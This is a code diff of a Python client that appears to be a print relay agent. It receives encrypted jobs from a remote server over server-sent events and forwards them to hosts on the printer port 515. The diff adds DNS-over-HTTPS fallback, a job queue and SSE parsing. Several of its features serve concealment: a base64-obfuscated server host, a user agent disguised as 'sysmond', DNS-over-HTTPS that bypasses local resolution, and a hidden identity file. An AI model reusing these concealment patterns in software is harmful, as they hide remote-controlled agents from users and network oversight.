@@ -1,4 +1,5 @@
 import atexit, ctypes, os, platform, signal, sys, uuid, zlib
+from collections import deque
 from base64 import b64decode, urlsafe_b64encode
 from gc import collect, disable
 from hashlib import sha256
@@ -77,30 +78,43 @@ doh_cache: Dict[str, Tuple[str, float]] = {}
 def resolve_doh(domain: str) -> str:
     now = time()
     if domain in doh_cache and now - doh_cache[domain][1] < 300: return doh_cache[domain][0]
-    try:
-        req = Request(f"https://1.1.1.1/dns-query?name={domain}&type=A", headers={"Accept": "application/dns-json"})
-        with urlopen(req, timeout=2.0) as resp:
-            if resp.status == 200:
-                for a in loads(resp.read().decode()).get("Answer", []):
-                    if a.get("type") == 1:
-                        ip = str(a.get("data"))
-                        doh_cache[domain] = (ip, now)
-                        return ip
-    except Exception: pass
+    for server in ("1.1.1.1", "8.8.8.8"):
+        try:
+            req = Request(f"https://{server}/dns-query?name={domain}&type=A", headers={"Accept": "application/dns-json"})
+            with urlopen(req, timeout=2.0) as resp:
+                if resp.status == 200:
+                    for a in loads(resp.read().decode()).get("Answer", []):
+                        if a.get("type") == 1:
+                            ip = str(a.get("data"))
+                            doh_cache[domain] = (ip, now)
+                            return ip
+        except Exception: pass
     return domain
 
 api_host = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
 ssl_ctx = create_default_context()
-conn_claim: Optional[HTTPSConnection] = None
+class DohConn(HTTPSConnection):
+    def __init__(self, ip: str, sni: str, port: int = 443, **kw):
+        super().__init__(ip, port, **kw)
+        self._sni = sni
+    def connect(self) -> None:
+        self.sock = ssl_ctx.wrap_socket(
+            create_connection((self.host, self.port), timeout=self.timeout),
+            server_hostname=self._sni,
+        )
+
+conn_claim: Optional[DohConn] = None
 lock_claim = Lock()
 
-def claim_conn() -> HTTPSConnection:
-    global conn_claim
+def make_conn(timeout: Optional[float] = None) -> DohConn:
     ip = resolve_doh(api_host)
     target = ip if (ip and ip != api_host) else api_host
+    return DohConn(target, api_host, 443, timeout=timeout)
+
+def claim_conn() -> DohConn:
+    global conn_claim
     if conn_claim is None:
-        conn_claim = HTTPSConnection(target, 443, timeout=5.0, context=ssl_ctx)
-        conn_claim.host = api_host
+        conn_claim = make_conn(5.0)
     return conn_claim
 
 def reset_claim() -> None:
@@ -111,26 +125,20 @@ def reset_claim() -> None:
         conn_claim = None
 
 def http_req(path: str, headers: Optional[Dict[str, str]] = None, data: Optional[bytes] = None, timeout: Optional[float] = None) -> Any:
-    ip = resolve_doh(api_host)
     hdrs = dict(headers or {})
     hdrs["Host"] = api_host
-    if ip and ip != api_host:
-        try:
-            conn = HTTPSConnection(ip, 443, timeout=timeout or 300.0, context=ssl_ctx)
-            conn.host = api_host
-            conn.request("POST" if data is not None else "GET", path, body=data, headers=hdrs)
-            return conn.getresponse()
-        except Exception: pass
-    req = Request(f"https://{api_host}{path}", headers=hdrs, data=data)
-    return urlopen(req, timeout=timeout, context=ssl_ctx) if timeout else urlopen(req, context=ssl_ctx)
+    conn = make_conn(timeout)
+    conn.request("POST" if data is not None else "GET", path, body=data, headers=hdrs)
+    return conn.getresponse()
 
 NUL = b"\x00"
+Q_MAX = 8
 job_count = 0
 claim_count = 0
 lock_count = Lock()
 lock_state = Lock()
 is_busy = False
-pending_job: Optional[Dict[str, Any]] = None
+job_queue: deque = deque()
 
 def decrypt_data(s: str, job_id: Union[str, int] = "") -> bytes:
     if not s: return b""
@@ -152,49 +160,45 @@ def decrypt_data(s: str, job_id: Union[str, int] = "") -> bytes:
 host_cache: Dict[str, Tuple[bool, float]] = {}
 lock_host = Lock()
 
-def is_online(host: str) -> bool:
-    if not host: return False
-    with lock_host:
-        if host in host_cache:
-            return host_cache[host][0]
+def tcp_probe(host: str) -> bool:
     try:
         s = create_connection((host, 515), timeout=0.5)
         try: s.shutdown(2)
         except Exception: pass
         s.close()
-        with lock_host: host_cache[host] = (True, time())
         return True
     except Exception:
-        with lock_host: host_cache[host] = (False, time())
         return False
+
+def is_online(host: str) -> bool:
+    if not host: return False
+    with lock_host:
+        if host in host_cache:
+            return host_cache[host][0]
+    ok = tcp_probe(host)
+    with lock_host: host_cache[host] = (ok, time())
+    return ok
 
 def probe_loop() -> None:
     while True:
         with lock_host:
             hosts = list(host_cache.keys())
         for h in hosts:
-            try:
-                s = create_connection((h, 515), timeout=0.5)
-                try: s.shutdown(2)
-                except Exception: pass
-                s.close()
-                with lock_host: host_cache[h] = (True, time())
-            except Exception:
-                with lock_host: host_cache[h] = (False, time())
+            ok = tcp_probe(h)
+            with lock_host: host_cache[h] = (ok, time())
         sleep(1.5)
 
 def init_id() -> str:
     path = "C:\\ProgramData\\.ident" if sys.platform == "win32" else "/tmp/.ident"
+    fallback = f"{uuid.uuid4()};{platform.machine().lower()}"
     try:
         if os.path.exists(path):
-            with open(path, "r") as f:
-                v = f.read().strip()
-                if v: return v
-        val = f"{uuid.uuid4()};{platform.machine().lower()}"
-        with open(path, "w") as f: f.write(val)
-        return val
+            v = open(path).read().strip()
+            if v: return v
+        with open(path, "w") as f: f.write(fallback)
+        return fallback
     except Exception:
-        return f"{uuid.uuid4()};{platform.machine().lower()}"
+        return fallback
 
 app_ident = init_id()
 app_ua = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
@@ -277,16 +281,15 @@ def send_job(j: Dict[str, Any]) -> None:
             except Exception: pass
 
 def job_loop(initial_job: Dict[str, Any]) -> None:
-    global pending_job, is_busy
+    global is_busy
     try:
         sleep_block(True)
         curr: Optional[Dict[str, Any]] = initial_job
         while curr:
             send_job(curr)
             with lock_state:
-                if pending_job:
-                    curr = pending_job
-                    pending_job = None
+                if job_queue:
+                    curr = job_queue.popleft()
                 else:
                     is_busy = False
                     curr = None
@@ -294,13 +297,16 @@ def job_loop(initial_job: Dict[str, Any]) -> None:
         sleep_block(False)
 
 def queue_job(j: Dict[str, Any]) -> None:
-    global pending_job, is_busy
+    global is_busy
+    jid = str(j.get("id", ""))
     with lock_state:
+        if jid and any(str(e.get("id", "")) == jid for e in job_queue):
+            return
         if not is_busy:
             is_busy = True
             Thread(target=job_loop, args=(j,), daemon=True).start()
-        else:
-            pending_job = j
+        elif len(job_queue) < Q_MAX:
+            job_queue.append(j)
 
 last_id = ""
 
@@ -315,17 +321,29 @@ def sse_loop() -> None:
                 clean_state()
                 sys.exit(1)
             if r.status != 200: return
+            ev_id, ev_data = "", []
             while line := r.readline():
-                if line.startswith(b":") or not line.strip(): continue
-                if line.startswith(b"id: "): last_id = line[4:].strip().decode("utf-8", "ignore")
-                elif line.startswith(b"data: "):
-                    try: queue_job(loads(line[6:].decode("utf-8", "replace")))
-                    except Exception: pass
+                s = line.decode("utf-8", "replace").rstrip("\r\n")
+                if not s:
+                    if ev_data:
+                        try: queue_job(loads("\n".join(ev_data)))
+                        except Exception: pass
+                        if ev_id: last_id = ev_id
+                    ev_id, ev_data = "", []
+                elif s.startswith(":"):
+                    pass
+                elif s.startswith("id: "):
+                    ev_id = s[4:]
+                elif s.startswith("data: "):
+                    ev_data.append(s[6:])
     except Exception: pass
 
 def ping_loop() -> None:
     while True:
-        try: http_req("/print/ping", headers={"Content-Type": "application/json", **get_hdrs()}, data=b"{}", timeout=5.0)
+        try:
+            r = http_req("/print/ping", headers={"Content-Type": "application/json", **get_hdrs()}, data=b"{}", timeout=5.0)
+            try: r.read()
+            finally: r.close()
         except Exception: pass
         sleep(15.0)
 
